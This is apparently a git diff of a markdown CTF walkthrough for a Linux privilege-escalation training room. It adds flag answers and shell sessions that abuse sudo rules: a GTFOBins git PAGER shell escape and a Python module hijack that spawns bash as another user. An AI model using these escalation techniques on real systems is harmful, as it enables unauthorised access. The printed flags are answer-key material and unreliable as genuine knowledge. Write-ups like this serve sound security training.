@@ -574,6 +574,8 @@ mission30@linuxagency:~$
 Good luck 47!!!!</p>
 <h3>Mission Active</h3>
 
+<br>
+
 <p>4.1. su into viktor user using viktor's flag as password<br>
 <code>No answer needed</code></p>
 
@@ -582,6 +584,8 @@ mission30@linuxagency:~$ su viktor
 Password:
 viktor@linuxagency:~$ 
 ```
+
+<br>
 
 <p>4.2. What is dalia's flag?<br>
 <code>dalia{4a94a7a7bb4a819a63a33979926c77dc}</code></p>
@@ -704,22 +708,112 @@ silvio{657b4d058c03ab9988875bc937f9c2ef}
 
 ![image](https://github.com/user-attachments/assets/d4d657fe-e509-4843-ad21-efb9290fdbb3)
 
-
-
+<br>
 
 <p>4.4. What is reza's flag?<br>
-<code>______</code></p>
+<code>reza{2f1901644eda75306f3142d837b80d3e}</code></p>
 
 ```bash
+silvio@linuxagency:~$ sudo -l
+Matching Defaults entries for silvio on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User silvio may run the following commands on linuxagency:
+    (reza) SETENV: NOPASSWD: /usr/bin/git
+silvio@linuxagency:~$ 
+```
+
+<p>GTFObins</p>
+
+![image](https://github.com/user-attachments/assets/336aaf43-e00d-405f-9149-5ebace8dfbb9)
+
+![image](https://github.com/user-attachments/assets/67b55135-ef3e-4fbe-b309-9f67c61b952d)
+
+```bash
+silvio@linuxagency:~$ sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+$ whoami
+reza
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+reza@linuxagency:/home/silvio$ cd ..
+reza@linuxagency:/home$ cd reza
+reza@linuxagency:~$ ls
+examples.desktop  flag.txt
+reza@linuxagency:~$ cat flag.txt
+reza{2f1901644eda75306f3142d837b80d3e}
 ```
 
 <p>4.5. What is jordan's flag?<br>
 <code>______</code></p>
 
 ```bash
+reza@linuxagency:~$ sudo -l
+Matching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User reza may run the following commands on linuxagency:
+    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+reza@linuxagency:~$ sudo -l -l       
+Matching Defaults entries for reza on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User reza may run the following commands on linuxagency:
+
+Sudoers entry:
+    RunAsUsers: jordan
+    Options: setenv, !authenticate
+    Commands:
+	/opt/scripts/Gun-Shop.py
+reza@linuxagency:/tmp/shop$ pwd                              
+/tmp/shop
+reza@linuxagency:/tmp/shop$ echo import os > SHOP.py
+reza@linuxagency:/tmp/shop$ echo 'os.system("/bin/bash")' >> SHOP.py
+reza@linuxagency:/tmp/shop$ cat SHOP.py
+import os
+os.system("/bin/bash")
+reza@linuxagency:/tmp/shop$ 
+
+
+
+reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
+sudo: unknown user: /opt/scripts/Gun-Shop.py
+sudo: error initializing audit plugin sudoers_audit
+reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
+Traceback (most recent call last):
+  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
+    import shop
+ModuleNotFoundError: No module named 'shop'
+reza@linuxagency:~$ mkdir -p /tmp/shop
+reza@linuxagency:~$ echo 'import os;os.system("/bin/bash");'> /tmp/shop/shop.py 
 ```
+<br>
+<br>
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| June 25, 2025     | 415      |     184ᵗʰ    |      5ᵗʰ     |     275ᵗʰ   |     6ᵗʰ    |  110,197 |    801    |     63    |
+
+</div>
+
+![image](https://github.com/user-attachments/assets/d17c699d-0e0a-4eff-98cb-154f6d271b30)
+
+![image](https://github.com/user-attachments/assets/7246eba2-96a6-4a96-a54b-21538a28cd0c)
+
+![image](https://github.com/user-attachments/assets/b8a51f45-d154-4059-96f7-d0b64e03ce37)
+
+![image](https://github.com/user-attachments/assets/c20baf8d-f161-4beb-ba64-f2d3921ec418)
+
+![image](https://github.com/user-attachments/assets/9d362ed8-fd2a-47cc-bb49-06cf0b510aca)
+
+![image](https://github.com/user-attachments/assets/2eebd4f7-6e56-460e-bba8-ff16519d5e2c)
+
+<br>
+<br>
 
 <p>4.6. What is ken's flag?<br>
 <code>______</code></p>
